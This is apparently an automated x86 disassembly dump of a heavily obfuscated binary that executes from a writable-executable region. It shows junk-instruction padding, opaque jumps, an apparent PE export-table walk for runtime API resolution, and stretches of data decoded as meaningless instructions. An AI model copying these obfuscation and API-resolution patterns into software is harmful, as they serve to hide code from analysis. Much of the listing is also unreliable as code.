fist [ ebx + ecx ]
xchg esi eax
or [ ecx ] bl
jno rwxdata
push es
js rwxdata
salc
loop rwxdata
or [ eax + 0x6 ] edi
mov ecx 0xd7c678cd
cmpsd [ esi ] [ edi ]
sbb [ ebx ] ah
and al 0xcc
cwde
and edx edx
out dx eax
sub al 0x16
shl esp 0x1
stosd [ edi ]
push ebp
dec edx
test ebx eax
pop ebp
retn 0xca94
fcomp [ ecx + 0x51 ]
in eax dx
mov ch 0xfb
movsb [ edi ] [ esi ]
push 0xffffffb4
pop edi
loopne rwxdata
nop
arpl [ edx - 0x72 ] si
not [ ebp - 0x3f ]
pop ebx
imul eax [ edx - 0x3 ] 0xffffffc2
je rwxdata
mov [ eax + 0x7e ] esp
jbe rwxdata
lea esi [ edx ]
pop ecx
push esi
and edi [ edi + eax - 0x1152cd28 ]
mov ebx 0xaf300963
cmp edx esp
cmc
add al 0x61
fidiv [ ecx ]
push cs
dec edi
or bh [ es : ecx - 0x5b ]
or eax 0x13e1a90f
int3
or edi esi
stosb [ edi ]
0xe2a13d55 0x6757
sub_101bfc5a
pushad
lea esp [ esp + 0x2c ]
je rwxdata
lea esi [ 0xffffffffc081b206 ]
pop esi
movzx di al
xchg di bx
pop edi
mov ch 0x31
pushfd
mov ebx [ esp + 0x4 ]
not cx
pushad
bswap cx
movzx cx cl
mov ecx [ esp + 0x28 ]
push 0x3aa792c6
mov esp ebp
bswap ebp
call sub_101bc9c8
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
stc
xor ebx ebx
xchg ecx eax
shrd eax ebp cl
mov [ ebp - 0x4 ] ebx
btr ax 0x4
rcl ah cl
shl al 0x5
mov eax edx
clc
movsx cx bl
btr cx dx
call sub_101d4159
pushfd
cmp dh ah
mov [ esp ] al
push esp
add ecx 0xffffffff
pushfd
lea esp [ esp + 0xc ]
je rwxdata
jmp rwxdata
push 0x85a0923c
sub eax eax
sub esp 0xfffffffc
cmp dl bl
cmc
stc
add edx 0x11c
push ebp
pushad
pushfd
pushfd
lea esp [ esp + 0x2c ]
jmp rwxdata
lea eax [ eax * 8 + 0x76abfba ]
mov eax [ edx + 0x8 ]
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
push esp
jmp rwxdata
pushfd
call sub_101d91e6
xchg si di
movzx esi [ edx + 0x1a ]
push [ esp ]
lea esi [ esi + edx + 0x1c ]
movsx di dl
push [ esp + 0x4 ]
mov di 0x7f34
mov edi [ ebp + 0x8 ]
jmp sub_101bdb2a
sub_101bfc89
stc
stc
add ecx 0x1
push 0x9e9d27c1
mov [ ebp - 0x8 ] ecx
pushad
mov [ esp ] 0xfa
lea esp [ esp + 0x28 ]
jmp rwxdata
inc esi
xchg cx di
mov ecx [ ebp - 0x8 ]
bt di 0x1
clc
shl di cl
rcr si 0x4
add ecx [ ebp - 0x4 ]
rol si 0x3
bts esi ecx
adc di ax
shr ecx 0x1
shl si cl
mov edi [ ebx + ecx * 4 ]
lea esi [ ebp * 8 - 0x260f86e7 ]
add edi eax
lea esi [ ebp * 8 - 0x6b10bcf9 ]
jmp rwxdata
jmp sub_101d52df
sub_101bfdf2
[ edi ] [ esi ]
pop esi
movzx si cl
jl rwxdata
jmp rwxdata
movsx si bl
pop esi
push ecx
pushfd
lea esp [ esp + 0x8 ]
jmp rwxdata
not si
push ecx
lea esi [ ebx * 4 + 0x227fb663 ]
mov esi [ esp + 0x4 ]
pushfd
mov [ esp ] cl
lea esp [ esp + 0xc ]
jmp rwxdata
pushad
jmp rwxdata
pushfd
pushfd
lea esp [ esp + 0x28 ]
call j_sub_101cb5d7
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
pushad
mov [ esp + 0x10 ] 0x9e
lodsb [ esi ]
rcl bl cl
sub al 0xf8
not bl
setge bl
ror al 0x1
not bl
setno bl
not al
dec bl
shr bl cl
xor al 0xbe
sbb bl dh
push [ esp ]
ror bl cl
jmp rwxdata
cmc
stc
bt ecx ebp
jmp rwxdata
neg al
not bl
pushfd
setne bl
mov bl ah
stosb [ edi ]
jmp rwxdata
xor ecx ecx
jmp rwxdata
push 0xd9d35aa3
mov bl 0x2
lea esp [ esp + 0x2c ]
jmp rwxdata
call j_sub_101cb5d7
jmp j_sub_101d1d2f
sub_101c0187
xchg ecx eax
mov [ esp ] 0xffc1
push 0x94a0cf64
push [ esp ]
dec eax
stc
shl eax 0x8
pushfd
lodsb [ esi ]
pushad
sub al 0xf8
push 0xb40a6d2a
ror al 0x1
stc
call sub_101c8c44
sub edi 0x4
mov [ esp ] 0xe1
pushad
mov [ esp ] bh
push [ edi ]
pop [ esp + 0x20 ]
cmc
cmp edi ebx
mov [ esp ] 0x793d
pushfd
lea esp [ esp + 0x24 ]
ja rwxdata
cmc
bt ax 0x2
pushad
stc
sub edi 0x4
pushad
clc
push [ edi ]
pop [ esp + 0x3c ]
test al 0x15
pushfd
stc
cmc
cmp edi ebx
jmp rwxdata
inc al
sar al 0x7
inc al
not al
sub ebx edi
lea edi [ eax * 8 - 0x3f0dcc2b ]
inc di
sete al
add ebx esp
add edi edi
rol edi cl
btr di 0x9
sub al 0xd2
mov edi ebx
rol al 0x3
rol al 0x1
rcr al 0x5
rol al cl
mov al 0x2e
cmp cl 0x58
pushad
stc
jmp rwxdata
pushfd
call sub_101be1d9
[ edi ]
pushfd
call sub_101bfa09
push edx
shrd ax cx cl
aam 0xb3
sub ax bp
mov eax [ ebp + 0x8 ]
call sub_101d1613
ja rwxdata
pushad
mov [ esp ] 0x8
mov [ esp + 0x4 ] 0x7e
push edi
mov esp esi
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
call sub_101d968a
call sub_101d2d5a
cmp dh 0xab
xchg [ esp ] esi
pushad
ror si cl
btc esi esp
mov esi edi
stc
call sub_101d929d
test bl dh
call sub_101be430
cli
push esi
sub [ edx ] cl
xor al 0x7f
pushad
mov eax [ 0x5e0a74cc ]
0xa151a44 0x1ee7
bts dx 0x2
xor eax eax
jge rwxdata
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
sub_101c0657
lea esp [ esp + 0x30 ]
call sub_101d8396
jmp rwxdata
jne rwxdata
pushfd
cmp dh ah
mov [ esp ] al
push esp
add ecx 0xffffffff
pushfd
lea esp [ esp + 0xc ]
je rwxdata
cwde
push 0xcd936a92
mov eax [ edx + 0x8 ]
push ecx
pushad
push ebp
pushfd
lea esp [ esp + 0x30 ]
jmp rwxdata
push 0x85a0923c
sub eax eax
sub esp 0xfffffffc
cmp dl bl
cmc
stc
add edx 0x11c
push ebp
pushad
pushfd
pushfd
lea esp [ esp + 0x2c ]
jmp rwxdata
pushfd
call sub_101d91e6
push esp
jmp rwxdata
xchg si di
movzx esi [ edx + 0x1a ]
push [ esp ]
lea esi [ esi + edx + 0x1c ]
movsx di dl
push [ esp + 0x4 ]
mov di 0x7f34
mov edi [ ebp + 0x8 ]
jmp sub_101bdb2a
sub_101c5554
lea esp [ esp + 0x8 ]
ja rwxdata
cmc
bt ax 0x2
pushad
stc
sub edi 0x4
pushad
clc
push [ edi ]
pop [ esp + 0x3c ]
test al 0x15
pushfd
stc
cmc
cmp edi ebx
jmp rwxdata
sub al bl
jmp rwxdata
pushfd
call sub_101be1d9
sub ebx edi
btr di 0x1
sub al ah
add ebx esp
cmp ch 0x6b
shrd di sp cl
push 0x19de2cc0
mov edi ebx
neg al
mov [ esp ] ah
mov al 0x2e
call sub_101bdca0
or [ eax + 0x786eb17e ] al
or si [ ebx ]
jpe rwxdata
insd
xor eax 0xf9f80d25
or al 0x75
dec ecx
sahf
or [ ebx - 0x7a ] ah
sub eax [ ecx ]
dec esi
adc [ ebp + 0x51 ] ebp
push 0xd8839b76
cmpsd [ esi ] [ edi ]
arpl [ edx + ebp * 4 - 0x6b ] di
push ecx
outsb
jmp rwxdata
pushad
mov edi 0x7d8eb74
push 0xffffffd4
sub dl [ 0xffffffffd581bd92 ]
0x63fce627 0x4738
or [ ebp + 0x64 ] edx
sbb dh [ eax - 0x4184db92 ]
shl cl 0xbd
dec ebp
xchg edx eax
call 0x2a81203b
test [ esi - 0x2f1a2b96 ] edx
out dx eax
mov [ edi - 0x6bfc9fdf ] es
or ebx [ edi + edx * 4 ]
stosb [ edi ]
imul edx [ ecx ] 0x63
mov ebp 0x8a757362
stc
sub_101c5793
push 0x109c2584
push [ esp + 0x4 ]
lea esp [ esp + 0xc ]
push eax
mov [ esp ] eax
call sub_101d12b7
clc
mov edi [ edx + 0x24 ]
stc
add edi eax
test bp ax
push 0xc5360560
mov [ esp ] 0xba2e5eae
movzx ecx [ edi + ecx * 2 ]
pushfd
movzx di bl
rcl di cl
bsr di di
mov edi [ edx + 0x1c ]
pushad
clc
test cl ah
push 0x29a09d5d
add edi eax
cmp ax bx
call sub_101b89d4
mov [ 0xffffffffd2c0df9c ] al
insd
jle rwxdata
jne rwxdata
add al 0x8d
and al 0xc
sub_101c58b9
mov ecx [ ebp - 0x4 ]
mov [ esp ] al
bt ebp ecx
pushad
cmp [ ebp + 0x14 ] ecx
jmp rwxdata
call sub_101e4867
jmp rwxdata
not si
push ecx
lea esi [ ebx * 4 + 0x227fb663 ]
mov esi [ esp + 0x4 ]
pushfd
mov [ esp ] cl
lea esp [ esp + 0xc ]
jmp rwxdata
pushad
jmp rwxdata
pushfd
pushfd
lea esp [ esp + 0x28 ]
call j_sub_101cb5d7
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
pushad
mov [ esp + 0x10 ] 0x9e
lodsb [ esi ]
rcl bl cl
sub al 0xf8
not bl
setge bl
ror al 0x1
not bl
setno bl
not al
dec bl
shr bl cl
xor al 0xbe
sbb bl dh
push [ esp ]
ror bl cl
jmp rwxdata
cmc
stc
bt ecx ebp
jmp rwxdata
neg al
not bl
pushfd
setne bl
mov bl ah
stosb [ edi ]
jmp rwxdata
xor ecx ecx
jmp rwxdata
push 0xd9d35aa3
mov bl 0x2
lea esp [ esp + 0x2c ]
jmp rwxdata
call j_sub_101cb5d7
jmp j_sub_101d1d2f
sub_101c59be
cmp eax edx
call sub_101ca86b
xchg edx eax
push es
mov eax 0xcc92c47a
or eax 0xdbe0e80a
insd
sti
dec ecx
mov esp 0x902fb42a
or esi [ esi + eax * 2 - 0x28 ]
out 0xb8 eax
xchg edx eax
or al 0xd7
call 0xffffffffdc4f322f
sbb al ah
inc al
pop es
fsubr st1
stosd [ edi ]
adc esp [ edi * 8 + 0x66fd6b42 ]
fwait
push es
in eax dx
inc ecx
dec edi
push ebp
fbld [ edx - 0x43544c6c ]
fisub [ gs : 0x1dc7781a ]
clc
aad 0x62
push eax
jae rwxdata
sbb bh [ eax - 0x39 ]
sbb eax 0x5062d5f8
push 0xeeda7d79
mov cl 0x7e
in eax dx
out 0x9c eax
arpl [ eax + edx * 8 + 0xc ] dx
mov esi ebx
sub_101c6893
lea esp [ esp + 0x44 ]
jo rwxdata
call sub_101c5793
pop ecx
sbb eax [ ebx - 0x1ca428b9 ]
hlt
jne rwxdata
push eax
mov [ esp ] eax
call sub_101d12b7
sbb di bx
mov edi [ edx + 0x24 ]
cmp esp ebx
call sub_10115dfb
pushfd
pushad
mov [ esp + 0x38 ] rwxdata
jmp rwxdata
push [ eax ]
pop [ esp + 0x34 ]
mov [ esp + 0x4 ] 0x9a6d0070
push [ esp ]
pushfd
push esp
push [ esp + 0x40 ]
retn 0x44
sub_101c6a4b
pushad
lea esp [ esp + 0x28 ]
jne rwxdata
pushfd
jmp rwxdata
call j_sub_101159bb
shr eax 0x1
push [ esp + 0xc ]
lea esp [ esp + 0x30 ]
je rwxdata
cmp dh 0xab
xchg [ esp ] esi
pushad
ror si cl
btc esi esp
mov esi edi
stc
call sub_101d929d
test bl dh
call sub_101be430
cli
push esi
sub [ edx ] cl
xor al 0x7f
pushad
mov eax [ 0x5e0a74cc ]
0xa151a44 0x1ee7
pushad
pop esi
mov ebx [ esp + 0x1c ]
push 0x400635e4
push 0xefa1fa8b
not di
mov edi [ esp + 0x28 ]
pushfd
push ebx
mov esi [ esp + 0x34 ]
pushfd
lea ebp [ edx * 8 - 0x4564252 ]
movzx bp dl
call sub_101c99e8
js rwxdata
pushad
pushfd
pushad
adc ecx ecx
pushfd
mov [ esp ] 0xbb
push ecx
push eax
lea esp [ esp + 0x50 ]
jmp rwxdata
pushfd
adc ecx ecx
pushfd
pushfd
lea esp [ esp + 0xc ]
jmp rwxdata
setpe bl
setns bl
inc ecx
pushfd
inc bl
inc ecx
sub esp 0xfffffffc
not bl
shl bl 0x4
shl bl 0x3
xchg ebp eax
clc
movsx ax al
mov eax ebp
neg bl
mov bl 0x1
sub_101c6aca
push [ esp ]
[ edi ]
lea esp [ esp + 0x28 ]
jpe rwxdata
call sub_101d49bd
pushfd
lea esp [ esp + 0x4 ]
jne rwxdata
pushad
mov [ esp ] 0x8
mov [ esp + 0x4 ] 0x7e
push edi
mov esp esi
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
movsx ax bl
setl al
jmp rwxdata
bts dx 0x2
xor eax eax
jge rwxdata
mov [ edi - 0x1 ] 0x0
lea eax [ esi * 2 - 0x5ed0ead8 ]
push ebx
pushfd
call sub_101bb312
in al 0xe3
and dh [ ecx ]
push cs
dec ecx
inc edi

mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
sub_101c6d40
lea esp [ esp + 0xc ]
jne rwxdata
pushfd
cmp dh ah
mov [ esp ] al
push esp
add ecx 0xffffffff
pushfd
lea esp [ esp + 0xc ]
je rwxdata
mov ah 0x0
lahf
lahf
mov eax [ edx + 0x8 ]
pushfd
pushfd
pushad
lea esp [ esp + 0x28 ]
jmp rwxdata
push 0x85a0923c
sub eax eax
sub esp 0xfffffffc
cmp dl bl
cmc
stc
add edx 0x11c
push ebp
pushad
pushfd
pushfd
lea esp [ esp + 0x2c ]
jmp rwxdata
pushfd
call sub_101d91e6
push esp
jmp rwxdata
xchg si di
movzx esi [ edx + 0x1a ]
push [ esp ]
lea esi [ esi + edx + 0x1c ]
movsx di dl
push [ esp + 0x4 ]
mov di 0x7f34
mov edi [ ebp + 0x8 ]
jmp sub_101bdb2a
sub_101c7f76
test ah 0x5
shr ebx 0xc
cmc
cmp ebx 0x1
mov [ esp ] ch
pushfd
call sub_101151c2
push ecx
lea esp [ esp + 0x4 ]
ja rwxdata
cmp al al
cmp ecx [ ebp - 0x4 ]
pushfd
pushfd
lea esp [ esp + 0x8 ]
jae rwxdata
jmp sub_101d52bb
bts dx 0x2
xor eax eax
jge rwxdata
call sub_101bfc89
mov [ esp ] 0xce67ca94
push ebp
lea esp [ esp + 0x4 ]
jg rwxdata
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
call j_sub_101d1f12
pushfd
mov [ esp ] 0x19fc7f78
pushfd
pushfd
lea esp [ esp + 0x8 ]
jmp j_sub_1020f431
sub_101c8151
mov [ esp ] 0x8c0045b
lea esp [ esp + 0x30 ]
jae rwxdata
setpe bl
setns bl
inc ecx
pushfd
inc bl
inc ecx
sub esp 0xfffffffc
not bl
shl bl 0x4
shl bl 0x3
xchg ebp eax
clc
movsx ax al
mov eax ebp
neg bl
mov bl 0x1
pushfd
jmp rwxdata
push esp
push eax
push esi
jmp rwxdata
cmp dh 0xab
xchg [ esp ] esi
pushad
ror si cl
btc esi esp
mov esi edi
stc
call sub_101d929d
test bl dh
call sub_101be430
cli
push esi
sub [ edx ] cl
xor al 0x7f
pushad
mov eax [ 0x5e0a74cc ]
0xa151a44 0x1ee7
cmp ah 0x5
call sub_1020d425
push eax
sub_101c857a
call sub_101c874b
out 0xfe al
and [ ebp - 0x4a5b4488 ] cl
add al 0xdb
jne rwxdata
sbb [ esi - 0x65bb5de4 ] esp
push esp
0x4ad506d9 0x96c8
jbe rwxdata
mov [ ecx + eax * 8 - 0x15 ] dl
or al 0xf5
cmp ebx 0x1
push edx
mov [ esp + 0x4 ] cl
lea esp [ esp + 0x8 ]
je rwxdata
cmp [ ecx + 0x7892ad97 ] dh
xchg [ ecx ] bl
cmpsb [ esi ] [ edi ]
sbb al 0xa2
inc esp
0x6d9ea54 0x4ad5
enter 0x7c96 0xe2
cmpsb [ esi ] [ edi ]
cli
jno rwxdata
movsx bx dl
ror bh cl
mov bx [ esi ]
push 0x4712b91c
and ebx 0xfff
bt di 0x3
push 0xf783b537
pushfd
add [ ebx + edi ] ax
pushad
pushfd
mov [ esp ] 0xa9
lea esp [ esp + 0x30 ]
jmp sub_101d8368
clc
pushfd
mov [ esp ] 0x11
cmp ebx 0x2
push ebx
lea esp [ esp + 0x8 ]
je rwxdata
lodsd [ esi ]
xchg edx eax
js rwxdata
and al 0xfa
cmp ebx 0xc
jge rwxdata
jb rwxdata
pop ebp
sbb dh [ ebp - 0xa ]
and bx si
bswap bx
jmp sub_101d6177
pushfd
push 0x6f477e48
pushfd
cmp ebx 0x3
pushfd
lea esp [ esp + 0x10 ]
je rwxdata
xchg edi eax
mov edx 0xddb686c5
adc eax 0xfa13251e
jb rwxdata
jbe rwxdata
movzx bx al
movzx bx dl
mov bx [ esi ]
cmc
call j_sub_101bf312
lea esp [ esp + 0x2c ]
je rwxdata
pushfd
lea esp [ esp + 0x4 ]
jmp sub_101d8368
out 0x6d al
sti
movsd [ edi ] fs : [ esi ]
xchg ebx eax
push edx
leave
mov ch 0x9c
jpo rwxdata
inc [ eax + 0xbb7c8d4 ]
lodsb [ esi ]
dec esi
fldenv [ ebp + 0x290935b6 ]
add al ch
int3
setpo bl
mov si 0xdb94
bswap di
movsx si cl
pop edi
not si
pop esi
not bh
mov bh 0xde
pop ebx
call sub_101d4da9
pushfd
call sub_101be1d9
not si
pushfd
mov esi eax
not eax
mov [ esp ] ebx
sets ah
movzx ax bl
lea eax [ LocalFree@IAT ]
push ebx
mov [ esp ] rwxdata
pushfd
call sub_101c8c32
pop edi
mov ah 0xba
push cs
add esp 0x585aca5b
mov dl 0x82
and eax 0x176132f6
mov ecx 0x87af0fa4
mov esp 0xfac4fec1
imul esp [ ebx ] 0x8e98dfe2
popad
dec edx
jge rwxdata
sar [ edx - 0x7a ] 0x1
add [ esi + 0x7b ] ah
push cs
xlat
sbb eax 0x42567a1c
sub al 0x72
push edi
[ eax + 0x1797bd75 ] esi
xor eax 0xca6a1f52
cmpsd [ esi ] [ edi ]
insd
mov edx 0x72397acf
call 0x4dc0e67f
lahf
jpe rwxdata
lea esi [ eax + 0x19526069 ]
loop rwxdata
pop edi
xchg edx eax
xor dl cl
insb
in al dx
shr dh 0x1
sub ebp [ esi ]
xor [ ecx - 0x3ebe81db ] bh
pop esi
xchg ebx eax
stosd [ edi ]
lahf
rcr [ 0xfffffffffbeeb1e1 ] 0xe3
hlt
xchg esi eax
jl rwxdata
mov edx 0xddb686c5
dec ebx
sar [ eax ] cl
mov cl 0x97
mov ebx 0xdb04b5a4
je rwxdata
sub_101c8a62
pushad
sub dl 0xf8
pushfd
push ecx
ror dl 0x1
push edx
not dl
clc
xor dl 0xbe
call sub_1020c467
cwde
fldenv [ esi - 0x69765908 ]
xlat
loop rwxdata
les ebp [ esi ]
cmp bh ah
dec esp
jb rwxdata
pop ds
mov al [ 0xffffffffe709c8b7 ]
mov [ edi + 0x12413ab ] fs
adc eax 0x6c7a442a
push ebx
xchg esp eax
int3
mov [ 0x72e4217c ] al
in al dx
pop ebp
mov eax [ 0xffffffff811d811e ]
mov dl 0xad
adc eax 0x499d61a9
xchg ebp eax
push es
jns rwxdata
push esi
cmp [ ecx ] ebx
pushad
sub al 0x30
stc
cmp al 0x9
mov [ esp + 0x8 ] 0x4d3048c3
call j_sub_101cabb2
not al
pop eax
pushfd
lea esp [ esp + 0x4 ]
ja rwxdata
cmpsb [ esi ] [ edi ]
mov bh 0x54

cmp al al
cmp ecx [ ebp - 0x4 ]
pushfd
pushfd
lea esp [ esp + 0x8 ]
jae rwxdata
pushfd
call sub_101d6678
bts dx 0x2
xor eax eax
jge rwxdata
call sub_101bfc89
mov [ esp ] 0xce67ca94
push ebp
lea esp [ esp + 0x4 ]
jg rwxdata
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
call j_sub_101d1f12
pushfd
mov [ esp ] 0x19fc7f78
pushfd
pushfd
lea esp [ esp + 0x8 ]
jmp j_sub_1020f431
sub_101c8d1d
push 0x10465784
pushfd
lea esp [ esp + 0xc ]
jne rwxdata
pushfd
jmp rwxdata
pushfd
jmp sub_101d797b
cmp dh 0xab
xchg [ esp ] esi
pushad
ror si cl
btc esi esp
mov esi edi
stc
call sub_101d929d
test bl dh
call sub_101be430
cli
push esi
sub [ edx ] cl
xor al 0x7f
pushad
mov eax [ 0x5e0a74cc ]
0xa151a44 0x1ee7
sub_101c99ba
push 0x60cc9eaf
pushad
lea esp [ esp + 0x2c ]
ja rwxdata
pushad
mov [ esp ] 0x8
mov [ esp + 0x4 ] 0x7e
push edi
mov esp esi
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
push 0x8028ed52
push 0xac378ee1
call sub_101d97a3
bts dx 0x2
xor eax eax
jge rwxdata
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
sub_101c99d9
lea esp [ esp + 0x48 ]
jae rwxdata
jmp rwxdata
call sub_101c58b4
call j_sub_101cb5d7
pushad
mov [ esp ] 0x66bd
adc al al
call sub_101d869e
jns rwxdata
test al 0xed
pop esi
mov al [ 0x529e876 ]
scasb [ edi ]
sbb al [ ebp - 0x46da829f ]
push esp
stosb [ edi ]
mov ebx 0x242030ee
sbb eax 0x4db14a5a
lds edi [ edx - 0x48 ]
lea edi [ bx + si - 0x1a ]
mov eax 0xb20dd9c6
pop eax
xchg ebx edi
retn
sub_101ca144
lea esp [ esp + 0x4 ]
jb rwxdata
jge rwxdata
cmc
cmc
cmp eax [ ebp - 0x10 ]
pushfd
call sub_101be20e
pop esi

mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
sub_101ca793
mov [ esp + 0xc ] rwxdata
call sub_101bd302
push ebx
dec eax
dec esp
push edi
inc ecx
push eax
dec ecx
insb
insb
add [ eax - 0x51ce29d8 ] bh
jne rwxdata
sub edi edi
sub ebp edx
xchg esp eax
mov esp 0xd3758c99
psadbw mm3 [ ebp - 0x1e ]
loopne rwxdata
call [ ebx + 0x48 ]
rcr dh 0x5
mov edx 0x421cf6e8
sub_101ca86b
cmp eax 0x7d00
pushad
push [ esp ]
call sub_101c8151
add [ eax ] al
add [ edi ] dl
push ebx
sbb eax 0x0
add [ eax ] al
add [ eax ] al
add [ eax - 0x5f ] ah
and [ eax ] al
add [ eax + 0x5323001b ] dl
sbb eax 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] ah
fcomp [ ebx ]
add [ eax + edx * 4 ] cl
sbb eax [ eax ]
sub edx [ ebx + 0x1d ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] bl
push edx
adc [ eax ] eax
adc al 0x90
sbb eax [ eax ]
xor edx [ ebx + 0x1d ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ecx * 2 - 0x6fe3ffe3 ] bl
sbb eax [ eax ]
cmp edx [ ebx + 0x1d ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi * 4 ] cl
sbb eax [ eax ]
and al 0x90
sbb eax [ eax ]
inc ebx
push ebx
sbb eax 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] dh
jecxz rwxdata
sbb eax 0x0
add [ eax ] al
add [ eax ] al
add [ eax + 0x3c001ca7 ] ah
nop
sbb eax [ eax ]
pop ebx
push ebx
sbb eax 0x0
add [ eax ] al
add [ eax ] al
add bh bl
0x20
add [ eax + edx * 4 ] ch
sbb eax [ eax ]
dec ebx
push ebx
sbb eax 0x0
add [ eax ] al
add [ eax ] al
add [ eax + 0x34001c8d ] cl
nop
sbb eax [ eax ]
push ebx
push ebx
sub_101cabb2
lea esp [ esp + 0x24 ]
ja rwxdata
pushad
mov [ esp ] 0x8
mov [ esp + 0x4 ] 0x7e
push edi
mov esp esi
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
stc
imul edx edx 0xa
bt edx eax
add edx eax
push ecx
mov [ esp ] bh
pushfd
lea esp [ esp + 0x8 ]
jmp rwxdata
bts dx 0x2
xor eax eax
jge rwxdata
mov al al
adc al bh
add edi 0x1
rcr al 0x1
push 0xae313a6d
inc al
add al 0x97
mov al [ edi ]
test bh ah
test al al
push 0x8f16e632
lea esp [ esp + 0x8 ]
je rwxdata
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
rcr al 0x6
shld ecx ebp cl
mov edi edx
and ecx 0xe1443ac4
jmp rwxdata
clc
clc
stc
sub al 0x30
bt bx si
stc
jmp rwxdata
mov ecx edi
test cl 0x74
add al 0xdb
mov al [ ecx ]
push 0x995b44fd
call sub_101d77ba
imul dh
xor [ esi ] bh
xor [ esi - 0x2a795038 ] 0xa0
cmp [ edi ] ecx
and ebx [ ebx - 0x42d6e984 ]
and [ ecx + edi * 2 - 0x7a656ab6 ] ecx
inc ecx
mov ebp 0xf965ad72
adc eax 0x15f92609
or esp edi
inc edx
push ebx
lea edx [ ecx - 0x18115000 ]
0x8c732e26 0xa392
cmp al 0x9
pushfd
call sub_101c99ba
shr al 0x3
ror al 0x2
rcr ah cl
mov eax [ ebp - 0x8 ]
test ch 0x99
test esi eax
cmp ah 0x5
cmc
shl eax 0x1
call sub_101bdee6
pushfd
lea edi [ ebx - 0x47c248e ]
movzx esi [ edx + 0x1a ]
pushfd
bswap di
lea esi [ esi + edx + 0x1c ]
jmp rwxdata
pushad
mov edi [ ebp + 0x8 ]
pushfd
call sub_101d96a1
push 0xe5bfe2b4
cmp al 0x9
pushad
lea esp [ esp + 0x24 ]
ja rwxdata
stc
imul edx edx 0xa
jmp rwxdata
jmp rwxdata
add edx eax
push 0x642b6212
push 0x3ff1ecec
mov [ esp + 0x4 ] bx
lea esp [ esp + 0x8 ]
jmp rwxdata
sub_101cb5d7
test ebx 0xba31c13b
cmc
cmp sp di
add dl dl
push edi
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushad
push [ esp ]
push [ esp + 0x24 ]
jpe rwxdata
not dl
pushfd
mov dl 0x6f
push edi
pushf
pop [ esp + 0x6 ]
call sub_1020d18a
sub bh 0x90
fmul [ es : esi ]
shl cl 0x1
mov esi 0x41071869
mov eax [ 0x3bb0ae64 ]
in al 0xf8
dec ebp
int1
xor al [ edx + 0x7c ]
push ss
cmp eax 0x5725c31b
jmp 0x48839a80
pushfd
push 0xa3aa557c
push [ esp + 0x8 ]
retn 0x34
retn 0x28
sub_101cb88c
pushfd
pushad
neg al
jmp rwxdata
shr eax 0x1
push [ esp + 0xc ]
lea esp [ esp + 0x30 ]
je rwxdata
pushad
pop esi
mov ebx [ esp + 0x1c ]
push 0x400635e4
push 0xefa1fa8b
not di
mov edi [ esp + 0x28 ]
pushfd
push ebx
mov esi [ esp + 0x34 ]
pushfd
lea ebp [ edx * 8 - 0x4564252 ]
movzx bp dl
call sub_101c99e8
js rwxdata
pushad
pushfd
pushad
adc ecx ecx
pushfd
mov [ esp ] 0xbb
push ecx
push eax
lea esp [ esp + 0x50 ]
jmp rwxdata
pushfd
adc ecx ecx
pushfd
pushfd
lea esp [ esp + 0xc ]
jmp rwxdata
setpe bl
setns bl
inc ecx
pushfd
inc bl
inc ecx
sub esp 0xfffffffc
not bl
shl bl 0x4
shl bl 0x3
xchg ebp eax
clc
movsx ax al
mov eax ebp
neg bl
mov bl 0x1
pushfd
jmp rwxdata
cmp dh 0xab
xchg [ esp ] esi
pushad
ror si cl
btc esi esp
mov esi edi
stc
call sub_101d929d
test bl dh
call sub_101be430
cli
push esi
sub [ edx ] cl
xor al 0x7f
pushad
mov eax [ 0x5e0a74cc ]
0xa151a44 0x1ee7
sub_101cee15
jmp rwxdata
lea esp [ esp + 0x4 ]
jb rwxdata
clc
cmc
pushfd
cmp ecx [ ebp - 0x8 ]
pushfd
lea esp [ esp + 0x8 ]
jbe rwxdata
clc
call sub_10209fc0
out 0xfa al
add al 0xbb
in al 0xb7
enter 0xf4d9 0x4a
bts dx 0x2
xor eax eax
jge rwxdata
sbb di bx
shld di bx 0x5
sbb si 0x7d95
inc si
sub ecx 0x1
xor di 0xafff
sbb di cx
bsr si ax
jmp rwxdata
xor al 0xea
sti
jno rwxdata
push esp
daa
fisubr [ ebp - 0x1e ]
pop ss
mov eax 0xf90cbd06
pop edx
stc
jle rwxdata
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
mov [ ebp - 0x4 ] ecx
inc esi
xchg cx di
mov ecx [ ebp - 0x8 ]
bt di 0x1
clc
shl di cl
rcr si 0x4
add ecx [ ebp - 0x4 ]
rol si 0x3
bts esi ecx
adc di ax
shr ecx 0x1
shl si cl
mov edi [ ebx + ecx * 4 ]
lea esi [ ebp * 8 - 0x260f86e7 ]
add edi eax
lea esi [ ebp * 8 - 0x6b10bcf9 ]
jmp rwxdata
xchg edx eax
cli
test ecx ebx
xor eax [ edi - 0xc ]
